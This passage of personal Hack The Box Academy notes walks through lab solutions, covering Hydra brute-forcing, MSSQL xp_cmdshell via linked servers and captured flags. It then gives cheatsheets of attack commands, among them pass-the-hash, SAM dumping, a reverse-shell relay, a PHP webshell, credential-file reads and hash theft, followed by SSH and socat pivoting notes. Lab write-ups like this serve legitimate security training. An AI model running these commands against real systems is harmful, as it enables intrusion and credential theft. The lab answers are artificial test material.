SF:ive\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creative\r
SF:\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port30021-TCP:V=7.93%I=7%D=3/1%Time=65E1E035%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,8F,"220\x20ProFTPD\x20Server\x20\(Internal\x20FTP\)\x20\[10\
SF:.129\.88\.133\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x
SF:20creative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20cre
SF:ative\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 153.29 seconds

┌─[us-academy-2]─[10.10.14.179]─[htb-ac-713396@htb-mziude0vvw]─[~/Sublist3r/subbrute]
└──╼ [★]$ ftp 10.129.88.133 30021
Connected to 10.129.88.133.
220 ProFTPD Server (Internal FTP) [10.129.88.133]
Name (10.129.88.133:root): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 ftp      ftp          4096 Apr 18  2022 simon
226 Transfer complete
ftp> cd simon
250 CWD command successful
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
-rw-rw-r--   1 ftp      ftp           153 Apr 18  2022 mynotes.txt
226 Transfer complete
ftp> get mynotes.txt
local: mynotes.txt remote: mynotes.txt
200 PORT command successful
150 Opening BINARY mode data connection for mynotes.txt (153 bytes)
226 Transfer complete
153 bytes received in 0.02 secs (7.6804 kB/s)
ftp>

┌─[us-academy-2]─[10.10.14.179]─[htb-ac-713396@htb-mziude0vvw]─[~/Sublist3r/subbrute]
└──╼ [★]$ cat mynotes.txt
234987123948729384293
+23358093845098
ThatsMyBigDog
Rock!ng#May
Puuuuuh7823328
8Ns8j1b!23hs4921smHzwn
237oHs71ohls18H127!!9skaP
238u1xjn1923nZGSb261Bs81

┌─[us-academy-2]─[10.10.14.179]─[htb-ac-713396@htb-mziude0vvw]─[~]
└──╼ [★]$ hydra pop3://10.129.88.133 -l simon -P mynotes.txt
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-03-01 14:48:16
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries (l:1/p:8), ~1 try per task
[DATA] attacking pop3://10.129.88.133:110/
[110][pop3] host: 10.129.88.133   login: simon   password: 8Ns8j1b!23hs4921smHzwn
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-03-01 14:48:21

┌─[us-academy-2]─[10.10.14.179]─[htb-ac-713396@htb-mziude0vvw]─[~]
└──╼ [★]$ hydra ssh://10.129.88.133 -l simon -P mynotes.txt
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-03-01 14:48:46
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries (l:1/p:8), ~1 try per task
[DATA] attacking ssh://10.129.88.133:22/
[22][ssh] host: 10.129.88.133   login: simon   password: 8Ns8j1b!23hs4921smHzwn
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-03-01 14:48:49

┌─[us-academy-2]─[10.10.14.179]─[htb-ac-713396@htb-mziude0vvw]─[~]
└──╼ [★]$ ssh simon@10.129.88.133
The authenticity of host '10.129.88.133 (10.129.88.133)' can't be established.
ECDSA key fingerprint is SHA256:3I77Le3AqCEUd+1LBAraYTRTF74wwJZJiYcnwfF5yAs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.88.133' (ECDSA) to the list of known hosts.
simon@10.129.88.133's password:
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-107-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 01 Mar 2024 02:49:16 PM UTC

  System load:  0.47               Processes:               232
  Usage of /:   16.7% of 13.72GB   Users logged in:         0
  Memory usage: 12%                IPv4 address for ens160: 10.129.88.133
  Swap usage:   0%

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


No mail.
Last login: Wed Apr 20 14:32:33 2022 from 10.10.14.20
simon@lin-medium:~$ ls
Maildir  flag.txt
simon@lin-medium:~$ cat flag.txt
HTB{1qay2wsx3EDC4rfv_M3D1UM}
simon@lin-medium:~$
```

**flag:** `HTB{1qay2wsx3EDC4rfv_M3D1UM}`

### Attacking Common Services - Hard

Host: 10.129.203.10

```sh
┌─[us-academy-2]─[10.10.14.179]─[htb-ac-713396@htb-mziude0vvw]─[~/Sublist3r/subbrute]
└──╼ [★]$ sudo nmap -A -T5 10.129.203.10
Starting Nmap 7.93 ( https://nmap.org ) at 2024-03-01 15:00 GMT
Nmap scan report for 10.129.203.10
Host is up (0.0058s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-03-01T14:59:09
|_Not valid after:  2054-03-01T14:59:09
| ms-sql-ntlm-info:
|   10.129.203.10:1433:
|     Target_Name: WIN-HARD
|     NetBIOS_Domain_Name: WIN-HARD
|     NetBIOS_Computer_Name: WIN-HARD
|     DNS_Domain_Name: WIN-HARD
|     DNS_Computer_Name: WIN-HARD
|_    Product_Version: 10.0.17763
| ms-sql-info:
|   10.129.203.10:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2024-03-01T15:01:24+00:00; 0s from scanner time.
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=WIN-HARD
| Not valid before: 2024-02-29T14:59:01
|_Not valid after:  2024-08-30T14:59:01
| rdp-ntlm-info:
|   Target_Name: WIN-HARD
|   NetBIOS_Domain_Name: WIN-HARD
|   NetBIOS_Computer_Name: WIN-HARD
|   DNS_Domain_Name: WIN-HARD
|   DNS_Computer_Name: WIN-HARD
|   Product_Version: 10.0.17763
|_  System_Time: 2024-03-01T15:00:45+00:00
|_ssl-date: 2024-03-01T15:01:24+00:00; 0s from scanner time.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Timing level 5 (Insane) used
No OS matches for host
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2024-03-01T15:00:48
|_  start_date: N/A
| smb2-security-mode:
|   311:
|_    Message signing enabled but not required

TRACEROUTE (using port 445/tcp)
HOP RTT     ADDRESS
1   8.64 ms 10.10.14.1
2   8.53 ms 10.129.203.10

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.51 seconds

┌─[us-academy-2]─[10.10.14.179]─[htb-ac-713396@htb-mziude0vvw]─[~]
└──╼ [★]$ smbmap -u simon -H 10.129.203.10 -R Home
[+] Guest session    IP: 10.129.203.10:445 Name: 10.129.203.10
        Disk                                                   Permissions Comment
 ----                                                   ----------- -------
 Home                                               READ ONLY
 .\Home\*
 dr--r--r--                0 Thu Apr 21 22:18:21 2022 .
 dr--r--r--                0 Thu Apr 21 22:18:21 2022 ..
 dr--r--r--                0 Fri Apr 22 04:14:02 2022 HR
 dr--r--r--                0 Thu Apr 21 21:11:44 2022 IT
 dr--r--r--                0 Fri Apr 22 04:14:51 2022 OPS
 dr--r--r--                0 Fri Apr 22 04:15:29 2022 Projects
 .\Home\IT\*
 dr--r--r--                0 Thu Apr 21 21:11:44 2022 .
 dr--r--r--                0 Thu Apr 21 21:11:44 2022 ..
 dr--r--r--                0 Thu Apr 21 21:11:53 2022 Fiona
 dr--r--r--                0 Thu Apr 21 22:15:09 2022 John
 dr--r--r--                0 Thu Apr 21 22:16:07 2022 Simon
 .\Home\IT\Fiona\*
 dr--r--r--                0 Thu Apr 21 21:11:53 2022 .
 dr--r--r--                0 Thu Apr 21 21:11:53 2022 ..
 fr--r--r--              118 Thu Apr 21 21:13:11 2022 creds.txt
 .\Home\IT\John\*
 dr--r--r--                0 Thu Apr 21 22:15:09 2022 .
 dr--r--r--                0 Thu Apr 21 22:15:09 2022 ..
 fr--r--r--              101 Thu Apr 21 22:14:58 2022 information.txt
 fr--r--r--              164 Thu Apr 21 22:13:40 2022 notes.txt
 fr--r--r--               99 Thu Apr 21 22:15:55 2022 secrets.txt
 .\Home\IT\Simon\*
 dr--r--r--                0 Thu Apr 21 22:16:07 2022 .
 dr--r--r--                0 Thu Apr 21 22:16:07 2022 ..
 fr--r--r--               94 Thu Apr 21 22:16:48 2022 random.txt

┌─[us-academy-2]─[10.10.14.179]─[htb-ac-713396@htb-mziude0vvw]─[~]
└──╼ [★]$ cat 10.129.203.10-Home_IT_*
Windows Creds

kAkd03SA@#!
48Ns72!bns74@S84NNNSl
SecurePassword!
Password123!
SecureLocationforPasswordsd123!!
Password Lists:

1234567
(DK02ka-dsaldS
Inlanefreight2022
Inlanefreight2022!
TestingDB123

Credentials

(k20ASD10934kadA
KDIlalsa9020$
JT9ads02lasSA@
Kaksd032klasdA#
LKads9kasd0-@

┌─[us-academy-2]─[10.10.14.179]─[htb-ac-713396@htb-mziude0vvw]─[~]
└──╼ [★]$ cat smb_users.txt
simon
john
fiona

┌─[us-academy-2]─[10.10.14.179]─[htb-ac-713396@htb-mziude0vvw]─[~]
└──╼ [★]$ hydra rdp://10.129.203.10 -L smb_users.txt -P smb_passes.txt
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-03-01 15:53:42
[WARNING] rdp servers often dont like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 57 login tries (l:3/p:19), ~15 tries per task
[DATA] attacking rdp://10.129.203.10:3389/
[3389][rdp] host: 10.129.203.10   login: fiona   password: 48Ns72!bns74@S84NNNSl
[ERROR] freerdp: The connection failed to establish.
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-03-01 15:53:50

┌─[us-academy-2]─[10.10.14.179]─[htb-ac-713396@htb-mziude0vvw]─[~]
└──╼ [★]$ xfreerdp /u:fiona /p:'48Ns72!bns74@S84NNNSl' /v:10.129.203.10
```

```sh
C:\Users\Fiona>sqlcmd
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go

--------------------------------------------------------------------------------------------------------------------------------
WIN-HARD\Fiona

(1 rows affected)

-----------
          0

(1 rows affected)
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO
name
--------------------------------------------------------------------------------------------------------------------------------
john
simon

(2 rows affected)
1> EXECUTE AS LOGIN = 'john'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO

--------------------------------------------------------------------------------------------------------------------------------
john

(1 rows affected)

-----------
          0

(1 rows affected)
1>
1> SELECT srvname, isremote FROM sysservers
2> go
srvname                                                                                                                          isremote
-------------------------------------------------------------------------------------------------------------------------------- --------
WINSRV02\SQLEXPRESS                                                                                                                     1
LOCAL.TEST.LINKED.SRV                                                                                                                   0

(2 rows affected)
1> EXEC [LOCAL.TEST.LINKED.SRV].master.dbo.sp_configure 'show advanced options', 1;
2> go
Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
1> EXEC ('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV];
2> go
1> EXEC [LOCAL.TEST.LINKED.SRV].master.dbo.sp_configure 'xp_cmdshell', 1;
2> go
Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
1> EXEC ('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV];
2> go
1> EXEC ('xp_cmdshell ''type C:\\Users\\Administrator\\Desktop\\flag.txt''') AT [LOCAL.TEST.LINKED.SRV]
2> go
output
--------------------------------------------------------------------------------------------------------------------------------
HTB{46u$!n9_l!nk3d_$3rv3r$}

(1 rows affected)
```

**flag:** `HTB{46u$!n9_l!nk3d_$3rv3r$}`

### Cheatsheet

**Attacking FTP**

| Command                                                                  | Description                                        |
| ------------------------------------------------------------------------ | -------------------------------------------------- |
| `ftp 192.168.2.142`                                                      | Connecting to the FTP server using the ftp client. |
| `nc -v 192.168.2.142 21`                                                 | Connecting to the FTP server using netcat.         |
| `hydra -l user1 -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.142` | Brute-forcing the FTP service.                     |

**Attacking SMB**

| Command                                                                                                         | Description                                                         |
| --------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------- |
| `smbclient -N -L //10.129.14.128`                                                                               | Null-session testing against the SMB service.                       |
| `smbmap -H 10.129.14.128`                                                                                       | Network share enumeration using smbmap.                             |
| `smbmap -H 10.129.14.128 -r notes`                                                                              | Recursive network share enumeration using smbmap.                   |
| `smbmap -H 10.129.14.128 --download "notes\note.txt"`                                                           | Download a specific file from the shared folder.                    |
| `smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"`                                                    | Upload a specific file to the shared folder.                        |
| `rpcclient -U'%' 10.10.110.17`                                                                                  | Null-session with the rpcclient.                                    |
| `./enum4linux-ng.py 10.10.11.45 -A -C`                                                                          | Automated enumeration of the SMB service using enum4linux-ng.       |
| `crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!'`                                            | Password spraying against different users from a list.              |
| `impacket-psexec administrator:'Password123!'@10.10.110.17`                                                     | Connect to the SMB service using the impacket-psexec.               |
| `crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec`            | Execute a command over the SMB service using crackmapexec.          |
| `crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users`                           | Enumerating Logged-on users.                                        |
| `crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam`                                        | Extract hashes from the SAM database.                               |
| `crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE`                            | Use the Pass-The-Hash technique to authenticate on the target host. |
| `impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146`                                            | Dump the SAM database using impacket-ntlmrelayx.                    |
| `impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64 reverse shell>` | Execute a PowerShell based reverse shell using impacket-ntlmrelayx. |

**Attacking SQL Databases**

| Command                                                                                                                    | Description                                                                                                   |
| -------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------- |
| `mysql -u julio -pPassword123 -h 10.129.20.13`                                                                             | Connecting to the MySQL server.                                                                               |
| `sqlcmd -S SRVMSSQL\SQLEXPRESS -U julio -P 'MyPassword!' -y 30 -Y 30`                                                      | Connecting to the MSSQL server.                                                                               |
| `sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h`                                                                        | Connecting to the MSSQL server from Linux.                                                                    |
| `sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h`                                                                     | Connecting to the MSSQL server from Linux while Windows Authentication mechanism is used by the MSSQL server. |
| `mysql> SHOW DATABASES;`                                                                                                   | Show all available databases in MySQL.                                                                        |
| `mysql> USE htbusers;`                                                                                                     | Select a specific database in MySQL.                                                                          |
| `mysql> SHOW TABLES;`                                                                                                      | Show all available tables in the selected database in MySQL.                                                  |
| `mysql> SELECT * FROM users;`                                                                                              | Select all available entries from the "users" table in MySQL.                                                 |
| `sqlcmd> SELECT name FROM master.dbo.sysdatabases`                                                                         | Show all available databases in MSSQL.                                                                        |
| `sqlcmd> USE htbusers`                                                                                                     | Select a specific database in MSSQL.                                                                          |
| `sqlcmd> SELECT * FROM htbusers.INFORMATION_SCHEMA.TABLES`                                                                 | Show all available tables in the selected database in MSSQL.                                                  |
| `sqlcmd> SELECT * FROM users`                                                                                              | Select all available entries from the "users" table in MSSQL.                                                 |
| `sqlcmd> EXECUTE sp_configure 'show advanced options', 1`                                                                  | To allow advanced options to be changed.                                                                      |
| `sqlcmd> EXECUTE sp_configure 'xp_cmdshell', 1`                                                                            | To enable the xp_cmdshell.                                                                                    |
| `sqlcmd> RECONFIGURE`                                                                                                      | To be used after each sp_configure command to apply the changes.                                              |
| `sqlcmd> xp_cmdshell 'whoami'`                                                                                             | Execute a system command from MSSQL server.                                                                   |
| `mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php'`                           | Create a file using MySQL.                                                                                    |
| `mysql> show variables like "secure_file_priv";`                                                                           | Check if the secure file privileges are empty to read locally stored files on the system.                     |
| `sqlcmd> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents`                 | Read local files in MSSQL.                                                                                    |
| `mysql> select LOAD_FILE("/etc/passwd");`                                                                                  | Read local files in MySQL.                                                                                    |
| `sqlcmd> EXEC master..xp_dirtree '\\10.10.110.17\share\'`                                                                  | Hash stealing using the xp_dirtree command in MSSQL.                                                          |
| `sqlcmd> EXEC master..xp_subdirs '\\10.10.110.17\share\'`                                                                  | Hash stealing using the xp_subdirs command in MSSQL.                                                          |
| `sqlcmd> SELECT srvname, isremote FROM sysservers`                                                                         | Identify linked servers in MSSQL.                                                                             |
| `sqlcmd> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]` | Identify the user and its privileges used for the remote connection in MSSQL.                                 |

**Attacking RDP**

| Command                                                                                              | Description                                                                     |
| ---------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------- |
| `crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'`                                 | Password spraying against the RDP service.                                      |
| `hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp`                                          | Brute-forcing the RDP service.                                                  |
| `rdesktop -u admin -p password123 192.168.2.143`                                                     | Connect to the RDP service using rdesktop in Linux.                             |
| `tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}`                                               | Impersonate a user without its password.                                        |
| `net start sessionhijack`                                                                            | Execute the RDP session hijack.                                                 |
| `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f` | Enable "Restricted Admin Mode" on the target Windows host.                      |
| `xfreerdp /v:192.168.2.141 /u:admin /pth:A9FDFA038C4B75EBC76DC855DD74F0DA`                           | Use the Pass-The-Hash technique to login on the target host without a password. |

**Attacking DNS**

| Command                                             | Description                                                           |
| --------------------------------------------------- | --------------------------------------------------------------------- |
| `dig AXFR @ns1.inlanefreight.htb inlanefreight.htb` | Perform an AXFR zone transfer attempt against a specific name server. |
| `subfinder -d inlanefreight.com -v`                 | Brute-forcing subdomains.                                             |
| `host support.inlanefreight.com`                    | DNS lookup for the specified subdomain.                               |

**Attacking Email Services**

| Command                                                                                                                                                 | Description                                                                            |
| ------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------- |
| `host -t MX microsoft.com`                                                                                                                              | DNS lookup for mail servers for the specified domain.                                  |
| `dig mx inlanefreight.com \| grep "MX" \| grep -v ";"`                                                                                                  | DNS lookup for mail servers for the specified domain.                                  |
| `host -t A mail1.inlanefreight.htb.`                                                                                                                    | DNS lookup of the IPv4 address for the specified subdomain.                            |
| `telnet 10.10.110.20 25`                                                                                                                                | Connect to the SMTP server.                                                            |
| `smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7`                                                                           | SMTP user enumeration using the RCPT command against the specified host.               |
| `python3 o365spray.py --validate --domain msplaintext.xyz`                                                                                              | Verify the usage of Office365 for the specified domain.                                |
| `python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz`                                                                                     | Enumerate existing users using Office365 on the specified domain.                      |
| `python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz`                                         | Password spraying against a list of users that use Office365 for the specified domain. |
| `hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3`                                                                                               | Brute-forcing the POP3 service.                                                        |
| `swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Notification' --body 'Message' --server 10.10.11.213` | Testing the SMTP service for the open-relay vulnerability.                             |

### Complete

[Link of Completion](https://academy.hackthebox.com/achievement/713396/116)

## Pivoting, Tunneling, and Port Forwarding

### Dynamic Port Forwarding with SSH and SOCKS Tunneling

**Executing the Local Port Forward**

The `-L` command tells the SSH client to request the SSH server to forward all the data we send via the port `1234` to `localhost:3306` on the Ubuntu server. By doing this, we should be able to access the MySQL service locally on port `1234`. We can use Netstat or Nmap to query our local host on `1234` port to verify whether the MySQL service was forwarded.

```sh
woadey@htb[/htb]$ ssh -L 1234:localhost:3306 ubuntu@10.129.202.64

ubuntu@10.129.202.64's password:
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 24 Feb 2022 05:23:20 PM UTC

  System load:             0.0
  Usage of /:              28.4% of 13.72GB
  Memory usage:            34%
  Swap usage:              0%
  Processes:               175
  Users logged in:         1
  IPv4 address for ens192: 10.129.202.64
  IPv6 address for ens192: dead:beef::250:56ff:feb9:52eb
  IPv4 address for ens224: 172.16.5.129

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

66 updates can be applied immediately.
45 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable
```

**Forwarding Multiple Ports**

```sh
woadey@htb[/htb]$ ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
```

**Enabling Dynamic Port Forwarding with SSH**

The `-D` argument requests the SSH server to enable dynamic port forwarding. Once we have this enabled, we will require a tool that can route any tool's packets over the port `9050`. We can do this using the tool proxychains, which is capable of redirecting TCP connections through TOR, SOCKS, and HTTP/HTTPS proxy servers and also allows us to chain multiple proxy servers together. Using proxychains, we can hide the IP address of the requesting host as well since the receiving host will only see the IP of the pivot host. Proxychains is often used to force an application's TCP traffic to go through hosted proxies like `SOCKS4`/`SOCKS5`, `TOR`, or `HTTP`/`HTTPS` proxies.

To inform proxychains that we must use port `9050`, we must modify the proxychains configuration file located at `/etc/proxychains.conf`. We can add `socks4 127.0.0.1 9050` to the last line if it is not already there.

```sh
woadey@htb[/htb]$ ssh -D 9050 ubuntu@10.129.202.64
```

```sh
woadey@htb[/htb]$ tail -4 /etc/proxychains.conf

# meanwile
# defaults set to "tor"
socks4 127.0.0.1 9050
```

```sh
woadey@htb[/htb]$ proxychains nmap -v -sn 172.16.5.1-200

ProxyChains-3.1 (http://proxychains.sf.net)

Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:30 EST
Initiating Ping Scan at 12:30
Scanning 10 hosts [2 ports/host]
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.2:80-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.5:80-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.6:80-<--timeout
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0

<SNIP>
```

### Remote/Reverse Port Fowarding with SSH

```sh
woadey@htb[/htb]$ ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```

![Reverse Port Forwarding](images/44.webp)

### Socat Redirection with a Reverse Shell

Socat is a bidirectional relay tool that can create pipe sockets between 2 independent network channels without needing to use SSH tunneling. It acts as a redirector that can listen on one host and port and forward that data to another IP address and port. We can start Metasploit's listener using the same command mentioned in the last section on our attack host, and we can start socat on the Ubuntu server.

Socat will listen on localhost on port 8080 and forward all the traffic to port 80 on our attack host (10.10.14.18). Once our redirector is configured, we can create a payload that will connect back to our redirector, which is running on our Ubuntu server. We will also start a listener on our attack host because as soon as socat receives a connection from a target, it will redirect all the traffic to our attack host's listener, where we would be getting a shell.

```sh
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

### SSH Pivoting with Sshuttle

[Sshuttle](https://github.com/sshuttle/sshuttle) is another tool written in Python which removes the need to configure proxychains. However, this tool only works for pivoting over SSH and does not provide other options for pivoting over TOR or HTTPS proxy servers. `Sshuttle` can be extremely useful for automating the execution of iptables and adding pivot rules for the remote host. We can configure the Ubuntu server as a pivot point and route all of Nmap's network traffic with sshuttle using the example later in this section.

```sh
woadey@htb[/htb]$ sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v

Starting sshuttle proxy (version 1.1.0).
c : Starting firewall manager with command: ['/usr/bin/python3', '/usr/local/lib/python3.9/dist-packages/sshuttle/__main__.py', '-v', '--method', 'auto', '--firewall']
fw: Starting firewall with Python version 3.9.2
fw: ready method name nat.
c : IPv6 enabled: Using default IPv6 listen address ::1
c : Method: nat
c : IPv4: on
c : IPv6: on
c : UDP : off (not available with nat method)
c : DNS : off (available)
c : User: off (available)
c : Subnets to forward through remote host (type, IP, cidr mask width, startPort, endPort):
c :   (<AddressFamily.AF_INET: 2>, '172.16.5.0', 32, 0, 0)
c : Subnets to exclude from forwarding:
c :   (<AddressFamily.AF_INET: 2>, '127.0.0.1', 32, 0, 0)
c :   (<AddressFamily.AF_INET6: 10>, '::1', 128, 0, 0)
c : TCP redirector listening on ('::1', 12300, 0, 0).
c : TCP redirector listening on ('127.0.0.1', 12300).
c : Starting client with Python version 3.9.2
c : Connecting to server...
ubuntu@10.129.202.64's password:
 s: Running server on remote host with /usr/bin/python3 (version 3.8.10)
 s: latency control setting = True
 s: auto-nets:False
c : Connected to server.
fw: setting up.
fw: ip6tables -w -t nat -N sshuttle-12300
fw: ip6tables -w -t nat -F sshuttle-12300
fw: ip6tables -w -t nat -I OUTPUT 1 -j sshuttle-12300
fw: ip6tables -w -t nat -I PREROUTING 1 -j sshuttle-12300
fw: ip6tables -w -t nat -A sshuttle-12300 -j RETURN -m addrtype --dst-type LOCAL
fw: ip6tables -w -t nat -A sshuttle-12300 -j RETURN --dest ::1/128 -p tcp
fw: iptables -w -t nat -N sshuttle-12300
fw: iptables -w -t nat -F sshuttle-12300
fw: iptables -w -t nat -I OUTPUT 1 -j sshuttle-12300
fw: iptables -w -t nat -I PREROUTING 1 -j sshuttle-12300
fw: iptables -w -t nat -A sshuttle-12300 -j RETURN -m addrtype --dst-type LOCAL
fw: iptables -w -t nat -A sshuttle-12300 -j RETURN --dest 127.0.0.1/32 -p tcp
fw: iptables -w -t nat -A sshuttle-12300 -j REDIRECT --dest 172.16.5.0/32 -p tcp --to-ports 12300
```

```sh
woadey@htb[/htb]$ nmap -v -sV -p3389 172.16.5.19 -A -Pn
```

### DNS Tunneling with Dnscat2

[Dnscat2](https://github.com/iagox86/dnscat2) is a tunneling tool that uses DNS protocol to send data between two hosts. It uses an encrypted `Command-&-Control` (`C&C` or `C2`) channel and sends data inside TXT records within the DNS protocol. Usually, every active directory domain environment in a corporate network will have its own DNS server, which will resolve hostnames to IP addresses and route the traffic to external DNS servers participating in the overarching DNS system. However, with dnscat2, the address resolution is requested from an external server. When a local DNS server tries to resolve an address, data is exfiltrated and sent over the network instead of a legitimate DNS request. Dnscat2 can be an extremely stealthy approach to exfiltrate data while evading firewall detections which strip the HTTPS connections and sniff the traffic. For our testing example, we can use dnscat2 server on our attack host, and execute the dnscat2 client on another Windows host.

### SOCKS5 Tunneling with Chisel

[Chisel](https://github.com/jpillora/chisel) is a TCP/UDP-based tunneling tool written in Go that uses HTTP to transport data that is secured using SSH. `Chisel` can create a client-server tunnel connection in a firewall restricted environment.

### ICMP Tunneling with SOCKS

